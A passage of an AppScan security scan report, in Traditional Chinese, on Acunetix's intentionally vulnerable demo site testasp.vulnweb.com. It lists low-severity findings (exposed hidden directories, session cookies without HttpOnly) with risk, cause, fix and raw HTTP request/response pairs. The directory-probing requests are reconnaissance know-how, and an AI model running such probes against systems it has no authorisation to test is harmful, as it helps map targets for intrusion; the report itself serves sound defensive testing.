						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>有可能擷取網站檔案系統結構的相關資訊，其可能會幫助攻擊者對映網站</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>使用不安全的方式配置 Web 伺服器或應用程式伺服器</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#attDirectoryFound_Adv">對禁止的資源發出「404 - 找不到」回應狀態碼，或將其完全移除</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">此測試嘗試檢測伺服器上的隱藏目錄/檔案。回應狀態為 200 OK 或 403 Forbidden。狀態 200 表示測試成功檢索所要求的目錄/檔案的內容。狀態 403 表示它的存在，即使不允許存取。</div></div><div class="name">測試要求和回應：</div><div class="code test">GET <span class="mark">/html/</span> HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Connection: keep-alive
Content-Length: 0


HTTP/1.1 403 Forbidden
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 05 Feb 2025 15:49:13 GMT
Content-Length: 1233

&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/&gt;
&lt;title&gt;403 - Forbidden: Access is denied.&lt;/title&gt;
&lt;style type="text/css"&gt;
&lt;!--
body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
fieldset{padding:0 15px 10px 15px;} 
h1{font-size:2.4em;margin:0;color:#FFF;}
h2{font-size:1.7em;margin:0;color:#CC0000;} 
h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} 
#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
background-color:#555555;}
#content{margin:0 0 0 2%;position:relative;}
.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
--&gt;
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div id="header"&gt;&lt;h1&gt;Server Error&lt;/h1&gt;&lt;/div&gt;
&lt;div id="content"&gt;
 &lt;div class="content-container"&gt;&lt;fieldset&gt;
  &lt;h2&gt;403 - Forbidden: Access is denied.&lt;/h2&gt;
  &lt;h3&gt;You do not have permission to view this directory or page using the credentials that you supplied.&lt;/h3&gt;
 &lt;/fieldset&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</div></div><div class="h3group" xmlns=""><h3>問題
						 
						3
						 
						/
						 
						6</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#attDirectoryFound">偵測到隱藏目錄</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_1">低</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">3.7</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N" target="_blank">AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/">http://testasp.vulnweb.com/</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">templates/ (Page)
						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>有可能擷取網站檔案系統結構的相關資訊，其可能會幫助攻擊者對映網站</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>使用不安全的方式配置 Web 伺服器或應用程式伺服器</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#attDirectoryFound_Adv">對禁止的資源發出「404 - 找不到」回應狀態碼，或將其完全移除</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">此測試嘗試檢測伺服器上的隱藏目錄/檔案。回應狀態為 200 OK 或 403 Forbidden。狀態 200 表示測試成功檢索所要求的目錄/檔案的內容。狀態 403 表示它的存在，即使不允許存取。</div></div><div class="name">測試要求和回應：</div><div class="code test">GET <span class="mark">/templates/</span> HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Connection: keep-alive
Content-Length: 0


HTTP/1.1 403 Forbidden
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 05 Feb 2025 15:49:13 GMT
Content-Length: 1233

&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/&gt;
&lt;title&gt;403 - Forbidden: Access is denied.&lt;/title&gt;
&lt;style type="text/css"&gt;
&lt;!--
body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
fieldset{padding:0 15px 10px 15px;} 
h1{font-size:2.4em;margin:0;color:#FFF;}
h2{font-size:1.7em;margin:0;color:#CC0000;} 
h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} 
#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
background-color:#555555;}
#content{margin:0 0 0 2%;position:relative;}
.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
--&gt;
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div id="header"&gt;&lt;h1&gt;Server Error&lt;/h1&gt;&lt;/div&gt;
&lt;div id="content"&gt;
 &lt;div class="content-container"&gt;&lt;fieldset&gt;
  &lt;h2&gt;403 - Forbidden: Access is denied.&lt;/h2&gt;
  &lt;h3&gt;You do not have permission to view this directory or page using the credentials that you supplied.&lt;/h3&gt;
 &lt;/fieldset&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</div></div><div class="h3group" xmlns=""><h3>問題
						 
						4
						 
						/
						 
						6</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#attDirectoryFound">偵測到隱藏目錄</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_1">低</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">3.7</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N" target="_blank">AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/">http://testasp.vulnweb.com/</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">images/ (Page)
						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>有可能擷取網站檔案系統結構的相關資訊，其可能會幫助攻擊者對映網站</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>使用不安全的方式配置 Web 伺服器或應用程式伺服器</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#attDirectoryFound_Adv">對禁止的資源發出「404 - 找不到」回應狀態碼，或將其完全移除</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">此測試嘗試檢測伺服器上的隱藏目錄/檔案。回應狀態為 200 OK 或 403 Forbidden。狀態 200 表示測試成功檢索所要求的目錄/檔案的內容。狀態 403 表示它的存在，即使不允許存取。</div></div><div class="name">測試要求和回應：</div><div class="code test">GET <span class="mark">/images/</span> HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Connection: keep-alive
Content-Length: 0


HTTP/1.1 403 Forbidden
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 05 Feb 2025 15:49:13 GMT
Content-Length: 1233

&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/&gt;
&lt;title&gt;403 - Forbidden: Access is denied.&lt;/title&gt;
&lt;style type="text/css"&gt;
&lt;!--
body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
fieldset{padding:0 15px 10px 15px;} 
h1{font-size:2.4em;margin:0;color:#FFF;}
h2{font-size:1.7em;margin:0;color:#CC0000;} 
h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} 
#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
background-color:#555555;}
#content{margin:0 0 0 2%;position:relative;}
.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
--&gt;
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div id="header"&gt;&lt;h1&gt;Server Error&lt;/h1&gt;&lt;/div&gt;
&lt;div id="content"&gt;
 &lt;div class="content-container"&gt;&lt;fieldset&gt;
  &lt;h2&gt;403 - Forbidden: Access is denied.&lt;/h2&gt;
  &lt;h3&gt;You do not have permission to view this directory or page using the credentials that you supplied.&lt;/h3&gt;
 &lt;/fieldset&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</div></div><div class="h3group" xmlns=""><h3>問題
						 
						5
						 
						/
						 
						6</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#attDirectoryFound">偵測到隱藏目錄</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_1">低</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">3.7</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N" target="_blank">AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/">http://testasp.vulnweb.com/</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">aspnet_client/ (Page)
						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>有可能擷取網站檔案系統結構的相關資訊，其可能會幫助攻擊者對映網站</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>使用不安全的方式配置 Web 伺服器或應用程式伺服器</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#attDirectoryFound_Adv">對禁止的資源發出「404 - 找不到」回應狀態碼，或將其完全移除</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">此測試嘗試檢測伺服器上的隱藏目錄/檔案。回應狀態為 200 OK 或 403 Forbidden。狀態 200 表示測試成功檢索所要求的目錄/檔案的內容。狀態 403 表示它的存在，即使不允許存取。</div></div><div class="name">測試要求和回應：</div><div class="code test">GET <span class="mark">/aspnet_client/</span> HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Connection: keep-alive
Content-Length: 0


HTTP/1.1 403 Forbidden
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 05 Feb 2025 15:49:13 GMT
Content-Length: 1233

&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/&gt;
&lt;title&gt;403 - Forbidden: Access is denied.&lt;/title&gt;
&lt;style type="text/css"&gt;
&lt;!--
body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
fieldset{padding:0 15px 10px 15px;} 
h1{font-size:2.4em;margin:0;color:#FFF;}
h2{font-size:1.7em;margin:0;color:#CC0000;} 
h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} 
#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
background-color:#555555;}
#content{margin:0 0 0 2%;position:relative;}
.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
--&gt;
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div id="header"&gt;&lt;h1&gt;Server Error&lt;/h1&gt;&lt;/div&gt;
&lt;div id="content"&gt;
 &lt;div class="content-container"&gt;&lt;fieldset&gt;
  &lt;h2&gt;403 - Forbidden: Access is denied.&lt;/h2&gt;
  &lt;h3&gt;You do not have permission to view this directory or page using the credentials that you supplied.&lt;/h3&gt;
 &lt;/fieldset&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</div></div><div class="h3group" xmlns=""><h3>問題
						 
						6
						 
						/
						 
						6</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#attDirectoryFound">偵測到隱藏目錄</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_1">低</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">3.7</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N" target="_blank">AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/">http://testasp.vulnweb.com/</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">_vti_cnf/ (Page)
						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>有可能擷取網站檔案系統結構的相關資訊，其可能會幫助攻擊者對映網站</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>使用不安全的方式配置 Web 伺服器或應用程式伺服器</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#attDirectoryFound_Adv">對禁止的資源發出「404 - 找不到」回應狀態碼，或將其完全移除</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">此測試嘗試檢測伺服器上的隱藏目錄/檔案。回應狀態為 200 OK 或 403 Forbidden。狀態 200 表示測試成功檢索所要求的目錄/檔案的內容。狀態 403 表示它的存在，即使不允許存取。</div></div><div class="name">測試要求和回應：</div><div class="code test">GET <span class="mark">/_vti_cnf/</span> HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Connection: keep-alive
Content-Length: 0


HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 05 Feb 2025 15:49:12 GMT
Content-Length: 926
Set-Cookie: ASPSESSIONIDQQQQQDST=JFPEDCMBODHIOOFBKJEDNLMI; path=/

vti_encoding:SR|utf8-nl
vti_timelastmodified:TR|05 Oct 2007 10:01:19 -0000
vti_extenderversion:SR|4.0.2.8912
vti_cacheddtm:TX|05 Oct 2007 10:01:19 -0000
vti_filesize:IR|3663
vti_cachedlinkinfo:VX|Q|styles.css H|http://www.acunetix.com/ S|Images/logo.gif H|Templatize.asp H|Default.asp H|Search.asp
vti_cachedsvcrellinks:VX|FQUS|acuforum/styles.css NHHS|http://www.acunetix.com/ FSUS|acuforum/Images/logo.gif FHUS|acuforum/Templatize.asp FHUS|acuforum/Default.asp FHUS|acuforum/Search.asp
vti_cachedtitle:SR|acuforum forums
vti_title:SR|acuforum forums
vti_cachedbodystyle:SR|&lt;body&gt;
vti_cachedhasbots:BR|false
vti_cachedhastheme:BR|false
vti_cachedhasborder:BR|false
vti_metatags:VR|HTTP-EQUIV=Content-Type text/html;\\ charset=iso-8859-1
vti_backlinkinfo:VX|acuforum/login.asp acuforum/register.asp acuforum/search.asp acuforum/default.asp acuforum/showthread.asp acuforum/showforum.asp acuforum/templatize.asp
</div></div><div id="attRespCookieNotHttpOnlySessionCookie" class="issueType" xmlns=""><div class="severity severity_1">低</div><div><h2 class="nowordwrap"><a href="#attRespCookieNotHttpOnlySessionCookie">在階段作業 Cookie 中遺漏 HttpOnly 屬性</a>
					 
					<span class="count">2</span><a name="attRespCookieNotHttpOnlySessionCookie"></a></h2></div><div class="toclink"><a class="toclink" href="#toc">目錄</a></div></div><div class="h3group" xmlns=""><h3>問題
						 
						1
						 
						/
						 
						2</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#attRespCookieNotHttpOnlySessionCookie">在階段作業 Cookie 中遺漏 HttpOnly 屬性</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_1">低</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">3.7</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N" target="_blank">AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/">http://testasp.vulnweb.com/</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">ASPSESSIONIDSQRQRDTS (Cookie)
						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>有可能竊取或操作客戶階段作業和 Cookie，並可能用來假冒合法的使用者，讓駭客可以檢視或變更使用者記錄，以及用該使用者的身分來執行交易</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>Web 應用程式設定的階段作業 Cookie 不含 HttpOnly 屬性</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#attRespCookieNotHttpOnlySessionCookie_Adv">新增 'HttpOnly' 屬性至所有階段作業 Cookie</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">AppScan 發現階段作業 Cookie 使用時不含 "HttpOnly" 屬性。</div></div><div class="name">測試要求和回應：</div><div class="code test">GET / HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Connection: keep-alive
Content-Length: 0


HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 05 Feb 2025 15:31:02 GMT
Content-Length: 3561
<span class="highlight">Set-Cookie: ASPSESSIONIDSQRQRDTS=JNJDJHPAHKAIPHLFMHELDIDK; path=/</span>


&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
&lt;html&gt;&lt;!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" --&gt;
&lt;head&gt;
&lt;!-- InstanceBeginEditable name="doctitle" --&gt;
&lt;title&gt;acuforum forums&lt;/title&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"&gt;
&lt;!-- InstanceBeginEditable name="head" --&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;link href="styles.css" rel="stylesheet" type="text/css"&gt;
&lt;/head&gt;
&lt;body&gt; 
&lt;table width="100%"  border="0" cellpadding="10" cellspacing="0"&gt; 
  &lt;tr bgcolor="#008F00"&gt; 
    &lt;td width="306px"&gt;&lt;a href="https://www.acunetix.com/"&gt;&lt;img src="Images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td align="right" valign="middle" bgcolor="#008F00" class="disclaimer"&gt;TEST and Demonstration site for &lt;a href="https://www.acunetix.com/vulnerability-scanner/"&gt;Acunetix Web Vulnerability Scanner&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
    &lt;td colspan="2"&gt;&lt;div class="menubar"&gt;&lt;a href="Templatize.asp?item=html/about.html" class="menu"&gt;about&lt;/a&gt; - &lt;a href="Default.asp" class="menu"&gt;forums&lt;/a&gt; - &lt;a href="Search.asp" class="menu"&gt;search&lt;/a&gt; 
     - &lt;a href="./Login.asp?RetURL=%2FDefault%2Easp%3F" class="menu"&gt;login&lt;/a&gt; - &lt;a href="./Register.asp?RetURL=%2FDefault%2Easp%3F" class="menu"&gt;register&lt;/a&gt; 
	- &lt;a href="https://www.acunetix.com/vulnerability-scanner/sql-injection/" class="menu"&gt;SQL scanner&lt;/a&gt; - &lt;a href="https://www.acunetix.com/websitesecurity/sql-injection/" class="menu"&gt;SQL vuln help&lt;/a&gt;
    &lt;/div&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
    &lt;td colspan="2"&gt;&lt;!-- InstanceBeginEditable name="MainContentLeft" --&gt;
	&lt;table width="100%" border="0" cellspacing="0" cellpadding="5"&gt;
      &lt;tr&gt;
        &lt;td class="tableheader"&gt;Forum&lt;/td&gt;
        &lt;td class="tableheader"&gt;Threads&lt;/td&gt;
        &lt;td class="tableheader"&gt;Posts&lt;/td&gt;
        &lt;td class="tableheader"&gt;Last Post&lt;/td&gt;
      &lt;/tr&gt;   
	&lt;tr bgcolor='#FFFFFF'&gt;&lt;td&gt;&lt;div class='forumtitle'&gt;&lt;a href='showforum.asp?id=0'&gt;Acunetix Web Vulnerability Scanner&lt;/a&gt;&lt;/div&gt;&lt;div class='forumdescription'&gt;Talk about Acunetix Web Vulnerablity Scanner&lt;/div&gt;&lt;/td&gt;&lt;td&gt;35&lt;/td&gt;&lt;td&gt;35&lt;/td&gt;&lt;td&gt;1/13/2025 6:27:08 AM&lt;/td&gt;&lt;/tr&gt;&lt;tr bgcolor='#e9ffe9'&gt;&lt;td&gt;&lt;div class='forumtitle'&gt;&lt;a href='showforum.asp?id=1'&gt;Weather&lt;/a&gt;&lt;/div&gt;&lt;div class='forumdescription'&gt;What weather is in your town right now&lt;/div&gt;&lt;/td&gt;&lt;td&gt;9&lt;/td&gt;&lt;td&gt;9&lt;/td&gt;&lt;td&gt;1/13/2025 6:21:00 AM&lt;/td&gt;&lt;/tr&gt;&lt;tr bgcolor='#FFFFFF'&gt;&lt;td&gt;&lt;div class='forumtitle'&gt;&lt;a href='showforum.asp?id=2'&gt;Miscellaneous&lt;/a&gt;&lt;/div&gt;&lt;div class='forumdescription'&gt;Anything crossing your mind can be posted here&lt;/div&gt;&lt;/td&gt;&lt;td&gt;47&lt;/td&gt;&lt;td&gt;47&lt;/td&gt;&lt;td&gt;1/13/2025 4:25:17 AM&lt;/td&gt;&lt;/tr&gt;
	&lt;/table&gt;&lt;!-- InstanceEndEditable --&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr align="right" bgcolor="#FFFFFF"&gt; 
    &lt;td colspan="2" class="footer"&gt;Copyright 2019 Acunetix Ltd.&lt;/td&gt; 
  &lt;/tr&gt; 
&lt;/table&gt; 
&lt;div style="background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px"&gt;
	&lt;p style="padding-left:20%;padding-right:20%"&gt;&lt;b&gt;Warning&lt;/b&gt;: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.&lt;/p&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;!-- InstanceEnd --&gt;&lt;/html&gt;
</div></div><div class="h3group" xmlns=""><h3>問題
						 
						2
						 
						/
						 
						2</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#attRespCookieNotHttpOnlySessionCookie">在階段作業 Cookie 中遺漏 HttpOnly 屬性</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_1">低</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">3.7</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N" target="_blank">AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/">http://testasp.vulnweb.com/</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">ASPSESSIONIDQQQQQDST (Cookie)
						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>有可能竊取或操作客戶階段作業和 Cookie，並可能用來假冒合法的使用者，讓駭客可以檢視或變更使用者記錄，以及用該使用者的身分來執行交易</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>Web 應用程式設定的階段作業 Cookie 不含 HttpOnly 屬性</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#attRespCookieNotHttpOnlySessionCookie_Adv">新增 'HttpOnly' 屬性至所有階段作業 Cookie</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">AppScan 發現階段作業 Cookie 使用時不含 "HttpOnly" 屬性。</div></div><div class="name">測試要求和回應：</div><div class="code test">GET /_vti_cnf/ HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
